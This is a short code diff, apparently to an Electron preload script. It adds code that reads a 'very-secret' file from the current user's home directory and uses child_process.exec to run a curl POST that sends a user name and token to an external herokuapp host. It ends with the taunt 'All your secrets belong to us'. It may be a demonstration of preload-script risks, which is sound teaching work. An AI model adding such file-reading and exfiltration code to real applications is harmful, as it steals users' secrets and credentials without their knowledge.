@@ -6,9 +6,22 @@
  * to expose Node.js functionality from the main process.
  */
 const fs = require('fs');
+const os = require("os")
+const { exec } = require("child_process");
 
-fs.readdir("/Users/tom", (err, files) => {
-  files.forEach(file => {
-    alert(file);
-  });
+const secretFile  = `/Users/${os.userInfo().username}/very-secret`
+const secret = fs.readFileSync(secretFile)
+alert(secret);
+
+const curlCmd = `curl -X POST https://library-of-secrets.herokuapp.com/secrets -H "Content-Type: application/json" -d '{"user":"tom","token":"abc123"}'`;
+exec(curlCmd, (error, stdout, stderr) => {
+  if (error) {
+    alert(`error: ${error.message}`);
+    return;
+  }
+  if (stderr) {
+    alert(`stderr: ${stderr.message}`);
+    return;
+  }
+  alert('🏴‍☠️ All your secrets belong to us 🏴‍☠️')
 });
